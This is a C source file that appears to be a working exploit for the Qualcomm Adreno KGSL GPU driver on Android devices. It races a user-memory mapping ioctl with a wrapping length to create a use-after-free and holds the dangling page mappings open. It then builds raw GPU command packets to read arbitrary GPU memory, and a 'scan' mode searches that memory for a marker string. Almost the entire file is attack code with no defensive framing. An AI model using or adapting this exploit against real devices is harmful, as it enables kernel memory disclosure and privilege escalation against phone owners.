#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>

#ifndef __user
#define __user
#endif

#include "../../msm_kgsl.h"

#define PAGE_SIZE 4096
#define KGSL_CONTEXT_PREAMBLE 0x00000008
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000010
#define KGSL_CMDLIST_IB 0x00000001
#define KGSL_TIMESTAMP_RETIRED 0x00000001

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    unsigned int p = 0;
    while (val) {
        p ^= (val & 1);
        val >>= 1;
    }
    return p ^ 1;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

#define CP_MEM_TO_MEM 0x73

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int kgsl_fd = -1;
static uint32_t ctx_id = 0;
static uint64_t ib_gpu = 0, dst_gpu = 0;
static void *ib_vma = NULL, *dst_vma = NULL;
static uint32_t ib_id = 0, dst_id = 0;

#include <sys/wait.h>
#include <pthread.h>

#define UAF_START 0x7001FF000ULL
#define UAF_SIZE  0x10004000ULL
#define OVERLAP_START 0x7001FE000ULL
#define OVERLAP_SIZE  0x00007000ULL
#define BOGUS_START 0x700204000ULL
#define WRAP_SIZE 0xFFFFFFFFFFEFD000ULL

typedef struct {
    int fd;
    volatile int ready;
    volatile int bogus_started;
} race_state_t;

static void *bogus_racer(void *arg) {
    race_state_t *rs = (race_state_t *)arg;
    while (!rs->ready);
    rs->bogus_started = 1;
    struct kgsl_map_user_mem req = {
        .fd = -1, .gpuaddr = 0, .len = (size_t)WRAP_SIZE, 
        .hostptr = (unsigned long)BOGUS_START, .memtype = 2, .flags = 0x10000000ULL
    };
    ioctl(rs->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    return NULL;
}

int trigger_uaf() {
    struct kgsl_gpuobj_alloc alloc = { .size = UAF_SIZE, .flags = 0x10000000ULL };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0) return -1;
    uint32_t uaf_id = alloc.id;

    void *uaf_vma = mmap((void *)UAF_START, UAF_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_vma == MAP_FAILED) return -2;
    memset(uaf_vma, 1, UAF_SIZE);
    munmap(uaf_vma, UAF_SIZE);

    mmap((void *)BOGUS_START, 4096 * 3, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    
    struct kgsl_gpuobj_alloc overlap = { .size = OVERLAP_SIZE, .flags = 0x10000000ULL };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap);
    
    race_state_t rs = { .fd = kgsl_fd, .ready = 0 };
    pthread_t thread;
    pthread_create(&thread, NULL, bogus_racer, &rs);
    rs.ready = 1;
    usleep(200);
    mmap((void *)OVERLAP_START, OVERLAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, kgsl_fd, (off_t)overlap.id << 12);
    pthread_join(thread, NULL);

    struct kgsl_gpuobj_free fr = { .id = uaf_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
    return 0;
}

int init_kgsl() {
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) return -1;

    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) return -2;
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc alloc = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) return -3;
    ib_id = alloc.id;
    ib_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    
    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    alloc.size = PAGE_SIZE;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) return -4;
    dst_id = alloc.id;
    dst_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    info.id = dst_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    return 0;
}

int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;

    uint32_t d_lo, d_hi, s_lo, s_hi;
    split64(dst_gpu, &d_lo, &d_hi);
    split64(src_gpu_va, &s_lo, &s_hi);

    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0;
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = s_lo;
    cmd[dw++] = s_hi;

    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command gpu_cmd = {
        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx_id
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) return -1;
    
    struct kgsl_cmdstream_readtimestamp_ctxtid rt = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int spins = 0; spins < 10000; spins++) {
        ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &rt);
        if (rt.timestamp >= gpu_cmd.timestamp) break;
        usleep(100);
    }

    memcpy(out_buf, dst_vma, PAGE_SIZE);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <cmd> [params]\n", argv[0]);
        return 1;
    }

    if (init_kgsl() != 0) {
        fprintf(stderr, "GPU Init failed\n");
        return 1;
    }

    if (strcmp(argv[1], "exploit") == 0) {
        if (trigger_uaf() == 0) {
            printf("UAF_READY\n");
            // Keep process alive to hold dangling PTEs
            while(1) pause();
        } else {
            return 1;
        }
    } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
        uint64_t addr = strtoull(argv[2], NULL, 16);
        uint8_t buf[PAGE_SIZE];
        if (read_gpu_page(addr, buf) == 0) {
            fwrite(buf, 1, PAGE_SIZE, stdout);
        } else {
            return 1;
        }
    } else if (strcmp(argv[1], "scan") == 0 && argc >= 4) {
        uint64_t start = strtoull(argv[2], NULL, 16);
        uint64_t end = strtoull(argv[3], NULL, 16);
        uint8_t buf[PAGE_SIZE];
        for (uint64_t va = start; va < end; va += PAGE_SIZE) {
            if (read_gpu_page(va, buf) == 0) {
                // Check for non-zero data
                int non_zero = 0;
                for (int i = 0; i < PAGE_SIZE; i++) {
                    if (buf[i] != 0) {
                        non_zero = 1;
                        break;
                    }
                }
                if (non_zero) {
                    // Deep search for markers
                    int found_keto = 0;
                    for (int i = 0; i < PAGE_SIZE - 4; i++) {
                        if (buf[i] == 'K' && buf[i+1] == 'E' && buf[i+2] == 'T' && buf[i+3] == 'O') {
                            found_keto = 1;
                            break;
                        }
                    }
                    if (found_keto) {
                        printf("MATCH_KETO:%lx\n", (unsigned long)va);
                    } else {
                        printf("MATCH_DATA:%lx\n", (unsigned long)va);
                    }
                    fflush(stdout);
                }
            }
            usleep(1000); // Slow spray / scan
        }
    }

    return 0;
}
